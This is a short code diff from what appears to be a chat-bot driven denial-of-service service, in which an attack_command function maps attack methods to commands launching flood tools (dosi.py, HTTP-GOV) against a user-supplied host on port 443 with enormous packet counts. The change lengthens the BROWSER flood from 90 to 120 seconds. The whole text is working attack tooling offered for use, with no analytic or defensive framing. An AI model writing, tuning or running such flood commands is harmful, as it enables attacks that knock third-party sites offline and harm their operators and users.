@@ -293,8 +293,8 @@ def attack_command(message):
             command = ["python", "dosi.py", "raw", host, "443", "100000000000000000", "10000000000000000000"]
             duration = 90
         elif method == 'BROWSER':
-            command = ["node", "HTTP-GOV", host, "99999"]
-            duration = 90
+            command = ["node", "HTTP-GOV", host, "99999", "120"]
+            duration = 120
         elif method == 'HTTP':
             command = ["python", "dosi.py", "http", host, "443", "99999", "100000000"]
             duration = 90
